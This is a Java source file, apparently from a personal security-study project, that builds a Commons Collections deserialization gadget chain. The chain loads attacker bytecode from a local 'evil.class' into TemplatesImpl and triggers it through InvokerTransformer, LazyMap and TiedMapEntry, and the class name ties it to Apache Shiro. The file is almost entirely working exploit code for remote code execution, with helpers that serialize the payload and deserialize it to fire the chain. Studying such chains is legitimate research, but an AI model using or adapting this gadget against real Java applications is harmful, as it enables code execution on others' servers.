package CommonCollections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CCShiro {
    public static void main(String[] args) throws Exception {



        TemplatesImpl obj = new TemplatesImpl();
        Class tc = obj.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(obj, "aaa");
        Field bytecodeField = tc.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\java_project\\JavaSecurityStudy\\target\\classes\\CommonCollections\\evil.class"));
        byte[][] codes = {code};
        bytecodeField.set(obj, codes);
        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(obj,new TransformerFactoryImpl());

        Transformer invokertransformer = new InvokerTransformer("getClass", null, null);
        Map under_HashMap = new HashMap();
        Map decorate_LazyMap = LazyMap.decorate(under_HashMap, invokertransformer);

        TiedMapEntry tiedMap = new TiedMapEntry(decorate_LazyMap, obj);
        Map expMap = new HashMap();
        expMap.put(tiedMap, "valuevalue");
        decorate_LazyMap.clear();

        Field methodname = invokertransformer.getClass().getDeclaredField("iMethodName");
        methodname.setAccessible(true);
        methodname.set(invokertransformer,"newTransformer");

//      serialize(expMap);
        unserialize("ser.bin");
    }


    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
